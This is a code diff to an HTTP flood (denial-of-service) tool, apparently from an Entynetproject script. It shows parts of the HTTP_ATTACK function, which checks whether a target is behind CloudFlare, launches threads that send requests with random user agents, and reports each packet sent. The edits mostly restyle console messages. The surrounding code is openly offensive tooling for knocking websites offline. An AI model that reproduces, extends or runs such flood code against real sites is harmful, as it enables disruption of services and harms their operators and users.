@@ -2,7 +2,7 @@
 
 # MIT License
 #
-# Copyright (C) 2019-2020, Entynetproject. All Rights Reserved.
+# Copyright (C) 2020, Entynetproject. All Rights Reserved.
 #
 # Permission is hereby granted, free of charge, to any person obtaining a copy
 # of this software and associated documentation files (the "Software"), to deal
@@ -36,10 +36,11 @@ def HTTP_ATTACK(threads, attack_time, target):
 	FINISH = False
 
 	if ipTools.isCloudFlare(target):
-		if not input("[WARNING] Current site is under CloudFlare protection. Continue? y/N: ") in ("y", "Y", "1"):
+                print("\033[1;33m"+"[!]"+"\033[0m"+" This site is under CloudFlare protection.")
+		if not input("\033[1;77m"+"[?]"+"\033[0m"+"Continue HTTP attack? (y/N): ") in ("y", "Y", "1"):
 			exit()
 
-	print("[BEGIN] Attack started for " + str(attack_time) + " seconds...")
+	print("\033[1;34m"+"[*]"+"\033[0m"+" Starting HTTP attack...")
 	
 	threads_list = []
 	# Load 25 random user agents
@@ -69,12 +70,12 @@ def HTTP_ATTACK(threads, attack_time, target):
 				print(e)
 				time.sleep(2)
 			else:
-				print("[" + str(r.status_code) + "] Request sent! Payload size: " + str(len(payload)))
+				print("\033[1;32m"+"[+]"+"\033[0m"+" HTTP packet was sent! Packet size: " + str(len(payload)) + ".")
 
 
 	# Start threads
 	for thread in range(0, threads):
-		print("[BEGIN] Staring thread " + str(thread) + "...")
+		print("\033[1;34m"+"[*]"+"\033[0m"+" Staring thread " + str(thread) + "...")
 		t = Thread(target = http_flood)
 		t.start()
 		threads_list.append(t)
@@ -85,4 +86,4 @@ def HTTP_ATTACK(threads, attack_time, target):
 		FINISH = True
 		thread.join()
 	
-	print("[WARNING] HTTP attack stopped!")
+	print("\033[1;33m"+"[!]"+"\033[0m"+" HTTP attack completed.")
